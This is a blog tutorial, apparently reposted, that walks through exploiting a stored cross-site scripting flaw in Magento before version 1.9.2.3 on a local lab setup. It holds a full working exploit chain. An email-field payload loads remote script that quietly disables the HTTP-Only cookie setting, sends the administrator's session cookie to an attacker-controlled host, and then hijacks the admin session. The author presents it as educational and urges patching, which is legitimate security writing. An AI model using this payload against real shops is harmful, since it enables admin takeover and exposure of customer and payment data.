---
layout: post
title: "[TUTS] Let's Exploit Magento! (<= 1.9.2.3)"
date: '2016-05-23T11:05:00.003-07:00'
author: dw1
tags:
- Tutorial
- Exploit
modified_time: '2016-05-23T11:05:52.156-07:00'
blogger_id: tag:blogger.com,1999:blog-5363536484579258695.post-3937194955952039476
blogger_orig_url: https://dwi-siswant0.blogspot.com/2016/05/tuts-lets-exploit-magento-1923.html
---

<h4>Why?</h4><p>A <a href="http://www.seancperkins.com">friend of mine</a> sent me an <a href="https://blog.sucuri.net/2016/01/security-advisory-stored-xss-in-magento.html">interesting advisory</a> the other day,  demonstrating that there was an XSS exploit for the eCommerce platform  Magento. I like security advisories, mainly because it's an interesting  challenge and a good way to learn more about the underlying frameworks  you're using. Since it was a lot of fun to <a href="https://packetstormsecurity.com/files/author/11127/">exploit wordpress</a>, I  figure'd I'd try out this XSS exploit. It should go without saying, but  don't try this on systems that aren't yours, or you'll be violating the  <a href="http://www.leginfo.ca.gov/cgi-bin/displaycode?section=pen&amp;group=00001-01000&amp;file=484-502.9">law</a>. </p><h4>The plan</h4><p>As pointed out in the <a href="https://blog.sucuri.net/2016/01/security-advisory-stored-xss-in-magento.html">interesting advisory</a>, this is a flaw that has to  be triggered by an administrator checking on an order. So in our pretend  scenario we have two types of exploits going on:</p><ol><li>Taking advantage of the vulnerability itself </li><li>Convincing the admin to check your order</li></ol><p>Both of these are likely to be fairly easy given the nature of Magento.  Calling or emailing an adminstrator in reference to your order would get  any well-intentioned admin to check it out. And the first is trivially  done according to the advisery by using the quoted form of an email  address for your client account. So our attack plan is simple: </p><ol><li>Setup our server to receive information</li><li>Perform exploit and call up our friendly admin</li><li>Steal their credentials or perform actions under their name</li></ol><h4>Setup</h4><p>First off, we need to download a version of magento that isn't patched,  so we can grab any copy of magento that is less than 1.9.2.3 from the  <a href="https://www.magentocommerce.com/download">downloads page</a>. I had to create an account to download the software,  so do that if you need to (use <a href="https://www.guerrillamail.com/">guerrillamail</a> if you need a quick  email address to use). Then <a href="https://www.siteground.com/tutorials/magento/magento_installation.htm">setup magento</a>. In my case I'll be using  <a href="https://www.apache.org/">apache</a> with the following host setup:</p><pre><code># My New Magento Install! Nothing bad could happen :D <br />&lt;VirtualHost *:80&gt;<br />    Servername local.magento.sec<br />    ErrorLog /tmp/error.log<br />    DocumentRoot /path/to/magento<br />    &lt;Directory /path/to/magento &gt;<br />        Options Indexes FollowSymLinks MultiViews<br />        AllowOverride All<br />        Order allow,deny<br />        allow from all<br />    &lt;/Directory&gt;<br />&lt;/VirtualHost&gt;<br /><br />#My Evil domain that will exploit the poor thing:<br />&lt;VirtualHost *:80&gt;<br />    Servername local.evil.sec<br />    CustomLog /tmp/exploit.log combined<br />    DocumentRoot /tmp<br />    &lt;Directory /tmp &gt;<br />        Order allow,deny<br />        allow from all<br />    &lt;/Directory&gt;<br />&lt;/VirtualHost&gt;<br /></code></pre><p>And then setup your hosts file appropriately:</p><pre><code>127.0.0.1 local.magento.sec local.evil.sec<br /></code></pre><p>And starting up apache and navigating to your local site should give you  the installation screen and you can follow the instructions to <a href="https://www.siteground.com/tutorials/magento/magento_installation.htm">setup magento</a>. In my case, I had to update some permissions and install the php5-gd  package on my system before being able to run magento. Your mileage may  vary. Also, installing magento is <em>slow</em>, the database has over 300  tables in the base install, be patient as you install it. </p><p>Once you're setup, you should be able to log in to your admin panel and  see that magento wants to update:</p><p><img style="max-width: 100%" src="//www.plasticsurgery.whoseopinion.com/images/tech-blog/magento-sec.jpg"></p><p>Ignoring that, <a href="https://www.siteground.com/tutorials/magento/magento_product.htm">create a product</a> or two and verify that your site is  working properly. </p><h4>Confirming the exploit</h4><p>Before we do anything complicated, we want to perform a smoke test to  make sure that we can trigger the problem ourselves. We'll do the same  test that the advisory did and simple alert on the page by using the  email <code>"&gt;&lt;script&gt;alert(1);&lt;/script&gt;"@sucuri.net</code>. When you do this  from the checkout page you'll get an error saying you it's not a valid  email. However, this is only a front end check that we can trivially  avoid by editing the HTML and removing the attributes the JS relys on  to validate:</p><p><img style="max-width: 100%" src="//www.plasticsurgery.whoseopinion.com/images/tech-blog/magento-client-side-validation.jpg"></p><p>Click through the rest of the steps and place your order.</p><p><img style="max-width: 100%" src="//www.plasticsurgery.whoseopinion.com/images/tech-blog/magento-order.jpg"></p><p>Then in the admin panel navigate to sales and your orders and verify  that the exploit happens:</p><p><img style="max-width: 100%" src="//www.plasticsurgery.whoseopinion.com/images/tech-blog/magento-success.jpg"></p><p>You'll see the pop-up twice before the page fully loads. Now the real  question is <em>what can we do?</em>.</p><h4>Getting dirty</h4><p>The first thing that comes to my mind is to attempt to steal the session  of the admin user. But a quick look at the cookies of the page will tell  us that such a thing won't work since the cookies are HTTP-Only:</p><p><img style="max-width: 100%" src="//www.plasticsurgery.whoseopinion.com/images/tech-blog/magento-cookies.jpg"></p><p>So that's seems like a dead end at first, but we can actually change  the settings for these cookies from magento! The HTTP-Only setting is  configured from the Web section of the System configuration page, and  by default is turned on:</p><p><img style="max-width: 100%" src="//www.plasticsurgery.whoseopinion.com/images/tech-blog/magento-config.jpg"></p><p>So the question becomes, how can we get to this page using our exploit? First off, we'll note that the navigation bar has an id of <code>nav</code>. So  that's trivial to get via javascript:</p><pre><code>var nav = document.getElementById('nav')<br /></code></pre><p>And once we do that it's simple to note that the navigation consists of  links like the following:</p><pre><code>&lt;li class="  last level1"&gt;<br />    &lt;a href="http://local.magento.sec/index.php/admin/system_config/index/key/d1b178d00a7755670c57af7f3f59bfa3/" class=""&gt;&lt;span&gt;Configuration&lt;/span&gt;&lt;/a&gt;<br />&lt;/li&gt;<br /></code></pre><p>We can't get much from the link itself, but the internal <code>span</code> tells us  everything we need to know. Leveraging this:</p><pre><code>var spans = nav.getElementsByTagName('span')<br />for(i in spans) { <br />    if (spans[i].hasOwnProperty('textContent') &amp;&amp; spans[i].textContent == "Configuration") { <br />        configLink = spans[i].parentElement.href<br />    } <br />}<br /></code></pre><p>And now we have the correct link to follow stored in <code>configLink</code>. Since  magento uses <a href="http://prototype.conio.net/">prototype</a> we can perform AJAX requests for pages pretty  easily:</p><pre><code>var configPage = document.createElement('span')<br />configPage.display = 'None';<br />new Ajax.Updater(configPage, configLink, {method: 'get'})<br /></code></pre><p>This will call up the system page which has another link we need. The  HTTP Only settings are in the Web settings, so we'll find that link in  the new page and then proceed from there:     </p><pre><code>var spans = configPage.getElementsByTagName('span')<br />for( var i = 0; i &lt; spans.length; i++) {<br />    if (spans[i].hasOwnProperty('textContent') &amp;&amp; spans[i].textContent.indexOf("Web")!=-1) { <br />        webConfigLink = spans[i].parentElement.href<br />    } <br />}<br />var webPage = document.createElement('span')<br />webPage.display = 'None'<br />new Ajax.Updater(webPage, webConfigLink, {method: 'get'})<br /></code></pre><p>Once we have this page we're nearly there. We just need to select the  correct option for HTTP cookies and then submit the form. This is easy  enough to do programmatically since the option has an id:</p><pre><code>//Get the select menu:<br />var select = webPage.getElementsBySelector('[id=web_cookie_cookie_httponly]')[0]<br /><br />//Set the options to No<br />for(var o = 0; o &lt; select.options.length; o++) {<br />    select.options[o].value = 0 //set it to the 'No' value easily<br />}<br /><br />//Grab that form<br />var form = webPage.getElementsByTagName('form')[0]<br />//Submit it via Ajax using prototype so the admin doesn't know<br />$(form).request({<br />    onFailure: function(){}, <br />    onSuccess: function(t){<br />        //wait for it...<br />    }<br />})<br /></code></pre><p>Now that we've done that the HTTP-Only flag on the cookies is gone,  which means that we can steal the admin's session. </p><p><img style="max-width: 100%" title="No exploit is complete without a smug anime face" src="//www.plasticsurgery.whoseopinion.com/images/tech-blog/magento-smug-cookie.jpg"></p><p>To send the session to the hacker we'll use our second virtual host and  the oldest trick in the book, the access log! Updating the <code>wait for it</code>  part of our form handler code gives us the final step to our hijack:</p><pre><code>onSuccess: function(t){<br />    var logPage = document.createElement('span')<br />    var evil = 'http://local.evil.sec?' + document.cookie<br />    logPage.display = 'None'<br />    new Ajax.Updater(logPage, evil, {method: 'get'})    <br />}<br /></code></pre><p>Once you do this, you'll see the admin cookie appear in the log file of  the hackers domain:</p><p><img style="max-width: 100%" src="//www.plasticsurgery.whoseopinion.com/images/tech-blog/magento-log.jpg"></p><p>Once we've got this, we just do a simple cookie setting and we're good  to run wild. First go to the admin page and open up your console. Then  set the document to be the value sent in your request:</p><p><img style="max-width: 100%" src="//www.plasticsurgery.whoseopinion.com/images/tech-blog/magento-breaking-in.jpg"></p><p>Refresh the page and you'll have access to the admin console:</p><p><img style="max-width: 100%" src="//www.plasticsurgery.whoseopinion.com/images/tech-blog/magento-in.jpg"></p><h4>Putting it all together</h4><p>It's easy to write all the above into the console to verify that it  works, but it's another thing to actually use the email exploit to run  the code. We have two options:</p><ol><li>Insert all that code into the email address</li><li>Have the email address inject a script to handle things for us</li></ol><p>Either way we need to wrap the code into a single package so let's do  that:</p><pre><code>/** Helpers */<br />function findLinkInSpan(spans, search) {<br />    for(i in spans) { <br />        if (spans[i].hasOwnProperty('textContent') &amp;&amp; spans[i].textContent.trim() == search.trim()) {<br />            return spans[i].parentElement.href;<br />        } <br />    }<br />}<br /><br />/** Wait for the AJAX to stick the data into our target element */<br />var waitingTime = 3000;<br /><br />function exploitOrderPage() {<br />    /** Navigate the menu */<br />    var nav = document.getElementById('nav');<br />    var spans = nav.getElementsByTagName('span');<br />    configLink = findLinkInSpan(spans, "Configuration");<br /><br />    /** Global for exploitConfigPage to use */<br />    configPage = document.createElement('span');<br />    configPage.display = 'None';<br />    new Ajax.Updater(configPage, configLink, {<br />            method: 'get', <br />            onSuccess: function(){<br />                setTimeout(function(){<br />                    exploitConfigPage()<br />                }, waitingTime); <br />            }<br />        }<br />    );<br />}<br /><br />function exploitConfigPage() {<br />    var spans = configPage.getElementsByTagName('span');<br />    var webConfigLink = findLinkInSpan(spans, 'Web');<br /><br />    /** Global for exploitWebPage to use */<br />    webPage = document.createElement('span');<br />    webPage.display = 'None';<br />    new Ajax.Updater(webPage, webConfigLink, {<br />            method: 'get', <br />            onSuccess: function(){<br />                setTimeout(function(){<br />                    exploitWebPage();<br />                },waitingTime);<br />            }<br />        }<br />    );<br />}<br /><br />function exploitWebPage() {<br />    var select = webPage.getElementsBySelector('[id=web_cookie_cookie_httponly]')[0];<br />    for(var o = 0; o &lt; select.options.length; o++) {<br />        select.options[o].value = 0; //set it to the 'No' value easily<br />    }<br />    var form = webPage.getElementsByTagName('form')[0]<br />    //Submit it via Ajax using prototype so the admin doesn't know<br />    $(form).request({<br />        onFailure: function(){}, <br />        onSuccess: function(t){<br />            var logPage = document.createElement('span');<br />            var evil = 'http://local.evil.sec?' + document.cookie;<br />            logPage.display = 'None';<br />            new Ajax.Updater(logPage, evil, {method: 'get'});<br />        }<br />    })<br />}<br /><br />/** On load we want to hide the weird email from the admin and steal! */<br />var anchors = document.getElementsByTagName('a')<br />for(var i = 0; i &lt; anchors.length; i++) {<br />    if(anchors[i] &amp;&amp; anchors[i].href == 'mailto:') {<br />        anchors[i].textContent = 'user@example.com';<br />    }<br />}<br />//GO!<br />exploitOrderPage();<br /></code></pre><p>The code is a little rough because we have a series of callbacks that  fire as the pages are loaded into the target divs by prototype. In my  testing it seemed like there was enough delay between when the request  completed and when variables like <code>configPage</code> were filled with data  that a timeout was the only way to ensure that there was data available  to iterate over with <code>.getElementsByTagName</code>.</p><p>Note that even though we don't have any CORS headers on our evil domain,  we don't actually need them to get the credentials in our log file since  the preflight request will show up in the log. If you were a real  attacker trying to be silent, you'd likely adjust your server  accordingly.</p><p>So let's try the first tactic, putting all of the code into an email  address in the checkout form:</p><p><img style="max-width: 100%" src="//www.plasticsurgery.whoseopinion.com/images/tech-blog/magento-exploit-checkout.jpg"></p><p>And editing the HTML with the inspector to remove the validation from  the element results in</p><p><img style="max-width: 100%" src="//www.plasticsurgery.whoseopinion.com/images/tech-blog/magento-length-error.jpg"></p><p>And checking out the magento source it looks like the length calculation  is pretty small:</p><pre><code>//lib/Zend/Validate/EmailAddress.php<br /> if ((strlen($this-&gt;_localPart) &gt; 64) || (strlen($this-&gt;_hostname) &gt; 255)) {<br />    $length = false;<br />    $this-&gt;_error(self::LENGTH_EXCEEDED);<br />}<br /></code></pre><p>So it seems like the first attempt is out since the full script can't be  fit into 64 characters. So instead let's try to load it from our evil  domain! We can do this by saving our script to <code>a.js</code> and loading it via  a <code>script</code> tag with the malicious email:</p><pre><code>"&lt;script src='//local.evil.sec/a.js'&gt;&lt;/script&gt;"@exploited.net<br /></code></pre><p>This comes in at 47 characters, so if you're testing with a longer local  domain name then a link shortener would be a good idea. Or if you don't  mind whiting out most of the screen you can drop seven characters by  removing the closing <code>&lt;script&gt;</code> tag (though that makes the attack more  obvious).</p><p><img style="max-width: 100%" src="//www.plasticsurgery.whoseopinion.com/images/tech-blog/magento-email-attack.jpg"></p><p>Submit your order after filling out the rest of the fields:</p><p><img style="max-width: 100%" src="//www.plasticsurgery.whoseopinion.com/images/tech-blog/magento-evil-order.jpg"></p><p>Navigating from our admin window to the new order, we'll be greeted with  our usual screen, but if we open up the console in a few seconds we'll  start to see the effects of the attack:</p><p><img style="max-width: 100%" src="//www.plasticsurgery.whoseopinion.com/images/tech-blog/magento-exploited-1.jpg"></p><p>And in our log files:</p><p><img style="max-width: 100%" src="//www.plasticsurgery.whoseopinion.com/images/tech-blog/magento-exploited-log.jpg"></p><p>Using this value we can then update our cookie from our hackers  perspective:</p><p><img style="max-width: 100%" src="//www.plasticsurgery.whoseopinion.com/images/tech-blog/magento-cookie.jpg"></p><p>Then simply click in the url and navigate to /admin and you've  successfully broken into a magento site using an exploit and session  hijacking!</p><p><img style="max-width: 100%" src="//www.plasticsurgery.whoseopinion.com/images/tech-blog/magento-im-in.jpg"></p><h4>So what now?</h4><p>Now you go and you <a href="https://www.magentocommerce.com/download">update magento</a> so that you don't run into someone  pulling this trick on you! The last thing you need is a random user  getting access to customer information, saved credit cards, or anything  like that! Just browsing through the configuration screen's it's easy to  see multiple attack vectors that one could use to install back-doors to  the system so that even after they upgrade, the attack can still get in.</p><p>Security is important, and I've written this post so that if anyone is using an old version of magento in production they can go to their boss,  demonstrate the attack here, and get their blessing to spend as much  time as neccesary in patching their system. It's not always fun to  upgrade when we could be developing, but doing so keeps the entire  internet healthy (you don't want your servers or clients helping out  with a DDoS do you?). So get out there and patch!</p><h4>Obvious Disclaimer</h4><p>In case it's not obvious This is example code meant for <em>educational  purposes only</em>. Do <em>not</em> run this on any machine you do not own! It is a  violation of both <a href="http://www.ncsl.org/research/telecommunications-and-information-technology/computer-hacking-and-unauthorized-access-laws.aspx">state and federal law</a> that often carries a hefty  fine. Just <strong>don't</strong> do it.</p><br /><hr>Source: http://www.plasticsurgery.whoseopinion.com